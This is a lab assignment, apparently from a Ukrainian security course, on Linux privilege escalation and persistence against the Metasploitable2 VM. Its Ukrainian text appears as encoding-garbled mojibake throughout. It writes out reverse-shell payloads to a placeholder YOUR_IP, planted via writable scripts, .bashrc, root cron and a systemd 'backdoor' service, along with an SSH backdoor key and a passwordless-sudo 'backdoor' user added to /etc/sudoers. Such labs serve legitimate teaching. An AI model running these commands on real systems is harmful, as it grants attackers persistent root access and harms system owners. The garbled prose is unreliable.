# üõ°Ô∏è Lab 6: –¥–æ–º–∞—à–Ω—î –∑–∞–≤–¥–∞–Ω–Ω—è: Privilege Escalation —Ç–∞ –ó–∞–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É (Metasploitable2)

> **üìã –í–∏–º–æ–≥–∏:**
>
> - ‚úÖ –í–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å—ñ –∑–∞–≤–¥–∞–Ω–Ω—è –Ω–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ–π –º–∞—à–∏–Ω—ñ Metasploitable2.
> - üì∏ –ö–æ–∂–µ–Ω –ø—É–Ω–∫—Ç –º–∞—î —Å—É–ø—Ä–æ–≤–æ–¥–∂—É–≤–∞—Ç–∏—Å—å —Å–∫—Ä—ñ–Ω—à–æ—Ç–∞–º–∏ –∞–±–æ –≤–∏–≤–æ–¥–æ–º –∫–æ–º–∞–Ω–¥ (–¥–ª—è –∑–≤—ñ—Ç—É).
> - ‚ö†Ô∏è –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ª–∏—à–µ –µ—Ç–∏—á–Ω—ñ –ø—ñ–¥—Ö–æ–¥–∏ —É —Ç–µ—Å—Ç–æ–≤–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ.

---

## üîì 1. –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —á–µ—Ä–µ–∑ world writable files

**–ó–∞–≤–¥–∞–Ω–Ω—è:**

1. üîç –ó–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª–∏ –∑ –ø—Ä–∞–≤–∞–º–∏ `-rw-rw-rw-` –∞–±–æ `-rwxrwxrwx`:
   ```bash
   find / -writable -type f 2>/dev/null
   ```
2. üß™ –í–∏—è–≤–∏—Ç–∏, —á–∏ —î —Å–µ—Ä–µ–¥ –Ω–∏—Ö –≤–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Å–∫—Ä–∏–ø—Ç–∏ –∞–±–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫–∏, —â–æ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å—Å—è –∑ –ø—ñ–¥–≤–∏—â–µ–Ω–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥ —á–µ—Ä–µ–∑ sudo/cron).
3. ‚úçÔ∏è –ó–∞–º—ñ–Ω–∏—Ç–∏ –≤–º—ñ—Å—Ç —Å–∫—Ä–∏–ø—Ç–∞ –Ω–∞ payload —Ç–∏–ø—É:
   ```bash
   /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   ```
4. üìû –û—Ç—Ä–∏–º–∞—Ç–∏ —Ä–µ–≤–µ—Ä—Å —à–µ–ª–ª.

---

## ‚è∞ 2. –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —á–µ—Ä–µ–∑ crontab

**–ó–∞–≤–¥–∞–Ω–Ω—è:**

1. üîç –ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ `cron` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
   ```bash
   cat /etc/crontab
   ls -la /etc/cron.*
   ```
2. ‚úèÔ∏è –Ø–∫—â–æ —î —Å–∫—Ä–∏–ø—Ç–∏, —â–æ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∑ root, –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —ó—Ö –Ω–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è.
3. üí£ –í—Å—Ç–∞–≤–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥ —É –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π —Å–∫—Ä–∏–ø—Ç (–∞–Ω–∞–ª–æ–≥—ñ—á–Ω–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –∑–∞–≤–¥–∞–Ω–Ω—é).

---

## üß† 3. –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —á–µ—Ä–µ–∑ suggester Metasploit

**–ó–∞–≤–¥–∞–Ω–Ω—è:**

1. üîó –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π —à–µ–ª–ª (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥ —á–µ—Ä–µ–∑ vsftpd).
2. üõ†Ô∏è –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ç–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ `linux/local_exploit_suggester` –≤ Metasploit:
   ```bash
   use post/multi/recon/local_exploit_suggester
   ```
3. üéØ –°–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
4. üìù –ó–∞—Ñ—ñ–∫—Å—É–≤–∞—Ç–∏, —è–∫–∏–π –º–µ—Ç–æ–¥ —Å–ø—Ä–∞—Ü—é–≤–∞–≤.

---

## üîê 4. –ó–∞–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è —á–µ—Ä–µ–∑ SSH –∫–ª—é—á—ñ

**–ó–∞–≤–¥–∞–Ω–Ω—è:**

1. üóùÔ∏è –°—Ç–≤–æ—Ä–∏—Ç–∏ SSH –∫–ª—é—á:
   ```bash
   ssh-keygen -t rsa -f backdoor_key
   ```
2. üì• –î–æ–¥–∞—Ç–∏ –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á —É `~/.ssh/authorized_keys` –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.
3. üîÑ –ü—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è —á–µ—Ä–µ–∑ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á:
   ```bash
   ssh -i backdoor_key user@target
   ```

---

## üë§ 5. –ó–∞–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è —á–µ—Ä–µ–∑ useradd

**–ó–∞–≤–¥–∞–Ω–Ω—è:**

1. ‚ûï –î–æ–¥–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —Å–∏—Å—Ç–µ–º—É:
   ```bash
   sudo useradd -m -s /bin/bash backdoor
   sudo passwd backdoor
   ```
2. üßæ –î–æ–¥–∞—Ç–∏ –π–æ–≥–æ –¥–æ `sudoers`:
   ```bash
   echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
   ```
3. ‚úÖ –ó–∞–π—Ç–∏ –ø—ñ–¥ –Ω–æ–≤–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º —ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –¥–æ—Å—Ç—É–ø.

---

## üåÄ 6. –ó–∞–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è —á–µ—Ä–µ–∑ .bashrc

**–ó–∞–≤–¥–∞–Ω–Ω—è:**

1. üñäÔ∏è –î–æ–¥–∞—Ç–∏ –¥–æ `.bashrc` —Ä–µ–≤–µ—Ä—Å —à–µ–ª–ª:
   ```bash
   echo "/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> ~/.bashrc
   ```
2. üì° –ó–∞–ø—É—Å—Ç–∏—Ç–∏ netcat –Ω–∞ —Å–≤–æ—ó–π –º–∞—à–∏–Ω—ñ:
   ```bash
   nc -lvnp 4444
   ```
3. ‚è≥ –î–æ—á–µ–∫–∞—Ç–∏—Å—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è, –∫–æ–ª–∏ —Ö—Ç–æ—Å—å –≤–≤—ñ–π–¥–µ –≤ —Å–∏—Å—Ç–µ–º—É.

---

## üï∞Ô∏è 7. –ó–∞–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è —á–µ—Ä–µ–∑ cron

**–ó–∞–≤–¥–∞–Ω–Ω—è:**

1. üßæ –°—Ç–≤–æ—Ä–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç backdoor.sh –∑ —Ä–µ–≤–µ—Ä—Å —à–µ–ª–æ–º.
2. üìÖ –î–æ–¥–∞—Ç–∏ –≤ `crontab`:
   ```bash
   echo "* * * * * root /path/to/backdoor.sh" >> /etc/crontab
   ```
3. üìû –û—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ netcat.

---

## üß© 8. –ó–∞–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è —á–µ—Ä–µ–∑ Systemd

**–ó–∞–≤–¥–∞–Ω–Ω—è:**

1. ‚öôÔ∏è –°—Ç–≤–æ—Ä–∏—Ç–∏ systemd —Å–µ—Ä–≤—ñ—Å:
   ```ini
   [Unit]
   Description=Reverse Shell Service

   [Service]
   ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

   [Install]
   WantedBy=multi-user.target
   ```
2. üíæ –ó–±–µ—Ä–µ–≥—Ç–∏ —è–∫ `/etc/systemd/system/backdoor.service`
3. üöÄ –ê–∫—Ç–∏–≤—É–≤–∞—Ç–∏:
   ```bash
   systemctl daemon-reexec
   systemctl enable --now backdoor.service
   ```

---

### üì¶ –ó–∞–≤–µ—Ä—à–µ–Ω–Ω—è

- üìÅ –ü—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–∂–Ω–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è –∑–∞–∞—Ä—Ö—ñ–≤—É–≤–∞—Ç–∏ –∞—Ä—Ç–µ—Ñ–∞–∫—Ç–∏: –∫–ª—é—á—ñ, —Å–∫—Ä—ñ–Ω—à–æ—Ç–∏, –≤–∏–≤–æ–¥–∏ –∫–æ–º–∞–Ω–¥.


